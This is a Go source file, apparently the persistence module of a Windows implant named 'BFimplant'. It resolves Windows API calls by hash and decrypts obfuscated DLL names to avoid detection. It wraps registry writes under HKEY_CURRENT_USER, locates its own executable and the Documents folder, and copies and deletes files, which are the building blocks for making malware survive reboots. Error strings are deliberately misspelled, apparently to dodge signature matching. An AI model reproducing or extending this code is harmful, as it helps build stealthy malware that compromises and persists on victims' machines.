package per

import (
	"syscall"
	"unsafe"
	"fmt"
	"BFimplant/winapiV2"

)

var (
	strr1 = winapiV2.DecryptString("$!3$5,vw")  //advapi32
	strr2 = winapiV2.DecryptString(". 7+ )vw")  //kernel32
	procRegCreateKeyExW  = winapiV2.GetFunctionAddressbyHash(strr1, 0xc988e74)
	procRegSetValueExW   = winapiV2.GetFunctionAddressbyHash(strr1, 0x2cea05e0)
	procRegCloseKey      = winapiV2.GetFunctionAddressbyHash(strr1, 0x7649a602)
	procGetModuleFileName = winapiV2.GetFunctionAddressbyHash(strr2, 0x206167c3)
	modShell32            = syscall.NewLazyDLL(winapiV2.DecryptString("6- ))vwk!))"))
	procSHGetFolderPath   = modShell32.NewProc("SHGetFolderPathW")
	procCopyFile          = winapiV2.GetFunctionAddressbyHash(strr2, 0x39e8f317)
	procDeleteFile		  = winapiV2.GetFunctionAddressbyHash(strr2, 0x99bee22f)
)

const (
	HKEY_CURRENT_USER = 0x80000001
	KEY_ALL_ACCESS    = 0xf003f
	REG_SZ            = 1
	csidlPersonal     = 0x0005 // CSIDL_PERSONAL - My Documents folder
)

func RegCreateKeyEx(key syscall.Handle, subKey string) (syscall.Handle, error) {
	var result syscall.Handle
	var disposition uint32
	ret, _, _ := syscall.SyscallN(procRegCreateKeyExW,
		uintptr(key),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(subKey))),
		0,
		uintptr(0),
		0,
		KEY_ALL_ACCESS,
		uintptr(0),
		uintptr(unsafe.Pointer(&result)),
		uintptr(unsafe.Pointer(&disposition)),
	)
	if ret != 0 {
		return 0, fmt.Errorf("regggcreaaaaakey failed with error code: %d", ret)
	}
	return result, nil
}

func RegSetValueEx(key syscall.Handle, valueName string, value string) error {
	ret, _, _ := syscall.SyscallN(procRegSetValueExW,
	uintptr(key),
	uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
	0,
	REG_SZ,
	uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(value))),
	uintptr(len(value)*2),
	)
	
	if ret != 0 {
		return fmt.Errorf("regggggsettttttValllll failed with error code: %d", ret)
	}
	return nil
}

func RegCloseKey(key syscall.Handle) error {
	ret, _, _ := syscall.SyscallN(procRegCloseKey,
		uintptr(key),
	)
	if ret != 0 {
		return fmt.Errorf("regggggclooooekey failed with error code: %d", ret)
	}
	return nil
}
// File operations

func GetExecutablePath() string {
	var buf [syscall.MAX_PATH]uint16
	_,_, err := syscall.SyscallN(procGetModuleFileName,0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if err != 0 && err.Error() != "The operation completed successfully. plants will have a goof healtha" {
		fmt.Println("Error getting "+winapiV2.DecryptString(" = &01$') ")+" path:", err)
		return ""
	}
	return syscall.UTF16ToString(buf[:])
}

func GetDocumentsPath() string {
	var buf [syscall.MAX_PATH]uint16
	hr, _, _ := syscall.SyscallN(procSHGetFolderPath.Addr(), 0, csidlPersonal, 0, 0, uintptr(unsafe.Pointer(&buf[0])))
	if hr != 0 {
		fmt.Println("Error gettttttt Doccccc path:", hr)
		return ""
	}
	return syscall.UTF16ToString(buf[:])
}

func FileExists(path string) bool {
	attrs, _ := syscall.GetFileAttributes(syscall.StringToUTF16Ptr(path))
	return attrs != syscall.INVALID_FILE_ATTRIBUTES
}

func CopyFile(src, dst string) error {
	srcPtr, err := syscall.UTF16PtrFromString(src)
	if err != nil {
		return err
	}
	dstPtr, err := syscall.UTF16PtrFromString(dst)
	if err != nil {
		return err
	}
	ret, _, err := syscall.SyscallN(procCopyFile, uintptr(unsafe.Pointer(srcPtr)), uintptr(unsafe.Pointer(dstPtr)), 0)
	if ret == 0 {
		return err
	}
	return nil
}

func DeleteFile(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	ret, _, err := syscall.SyscallN(procDeleteFile, uintptr(unsafe.Pointer(pathPtr)))
	if ret == 0 {
		return err
	}
	return nil
}


